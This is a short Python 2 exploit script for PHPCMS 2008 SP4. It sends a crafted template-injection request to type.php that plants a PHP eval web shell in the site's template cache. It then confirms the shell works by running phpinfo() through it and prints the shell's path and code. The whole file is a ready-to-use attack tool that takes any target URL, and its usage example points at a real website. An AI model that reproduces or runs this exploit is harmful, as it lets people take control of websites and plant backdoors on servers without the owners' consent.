#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2018/11/29 上午11:09
# @Author  : Stardustsky
# @File    : phpcms2008-sp4.py
# @Software: PyCharm

import urllib2
from optparse import OptionParser
import time
import re


def exp(url):
    payload = '/type.php?template=tag_(){};@eval($_GET[sai]);{//../rss'
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}
    url += payload
    request = urllib2.Request(url=url, headers=headers)
    try:
        res = urllib2.urlopen(request)
        time.sleep(1)
        response = urllib2.urlopen(url+"/data/cache_template/rss.tpl.php?sai=phpinfo();").read()
        if re.search("php", response):
            print "Exploit sucess, shell has been in /data/cache_template/rss.tpl.php"
            print "shell code is <?php @eval($_GET[sai]?>"
        else:
            print "Exploit fail."
            print "Please check if the web is phpcms2008 sp4 or the url is wrong."
    except Exception, e:
        print "Could not reach the url."



if __name__ == '__main__':
    print "+------------------------------+"
    print "+      PHPCMS 2008SP4 EXP      +"
    print "+        By:Stardustsky        +"
    print "+------------------------------+"
    parser = OptionParser("phpcms2008-sp4.py -u http://www.baidu.com", version='%prog 1.0')
    parser.add_option("-u", "--url", dest="url", help='input website url')
    (options, args) = parser.parse_args()
    exp(options.url)

